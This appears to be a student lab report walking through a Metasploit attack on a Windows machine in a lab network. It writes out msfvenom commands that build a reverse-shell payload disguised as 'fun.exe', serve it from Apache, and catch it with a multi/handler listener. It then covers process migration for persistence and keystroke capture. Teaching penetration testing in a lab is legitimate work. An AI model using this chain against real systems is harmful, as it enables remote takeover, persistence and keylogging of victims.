# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="701" height="341" alt="Screenshot 2026-08-25 090342" src="https://github.com/user-attachments/assets/9a2c185f-0c39-4087-9365-ac9659422de5" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="826" height="162" alt="Screenshot 2026-08-25 090447" src="https://github.com/user-attachments/assets/c44dc10d-3caf-4fb5-8c70-d992c62617e2" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

<img width="337" height="48" alt="Screenshot 2026-08-25 090622" src="https://github.com/user-attachments/assets/9469b7d6-399f-43ec-a232-d7b1a610ee76" />

Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="302" height="42" alt="Screenshot 2026-08-25 090631" src="https://github.com/user-attachments/assets/adeeaa44-4cb5-4139-bbd9-772bd975531c" />


Check the status of apache2
## OUTPUT:
<img width="861" height="390" alt="Screenshot 2026-08-25 090728" src="https://github.com/user-attachments/assets/d9bcae37-ef83-429c-bae0-41ea3b4c7386" />



Invoke msfconsole:
## OUTPUT:
<img width="817" height="542" alt="Screenshot 2026-08-25 090834" src="https://github.com/user-attachments/assets/8804cbdc-2d58-4c9c-86de-453a076c76fb" />




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:

<img width="835" height="605" alt="Screenshot 2026-08-25 090922" src="https://github.com/user-attachments/assets/e67d16e2-a7e7-4d3f-a47c-82e22bb423bd" />


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
<img width="652" height="136" alt="Screenshot 2026-08-25 091244" src="https://github.com/user-attachments/assets/9c5b0517-d908-4753-bfd2-30872350399e" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:

<img width="947" height="923" alt="Screenshot 2026-08-25 091436" src="https://github.com/user-attachments/assets/ad32fac4-ec5b-4215-b1c1-c51e08263a0a" />


Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:
<img width="947" height="621" alt="Screenshot 2026-08-25 091554" src="https://github.com/user-attachments/assets/25835479-d269-4aff-b45a-0528d8f045bd" />



On kali/parrot give the command exploit
## OUTPUT:
<img width="427" height="50" alt="Screenshot 2026-08-25 091835" src="https://github.com/user-attachments/assets/60b13446-253e-47a1-9ddc-7cc202fdd367" />



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:

<img width="312" height="155" alt="Screenshot 2026-08-25 091939" src="https://github.com/user-attachments/assets/37a96abc-7799-4860-8e79-daa059804536" />


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:
<img width="733" height="552" alt="Screenshot 2026-08-25 092023" src="https://github.com/user-attachments/assets/3df4ad54-25f4-4e6f-b1de-8bb89f333ef6" />


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 


keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:
<img width="611" height="245" alt="Screenshot 2026-09-04 215047" src="https://github.com/user-attachments/assets/8ca0263e-2a93-4cc2-84a6-0daaaa950b05" />




## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

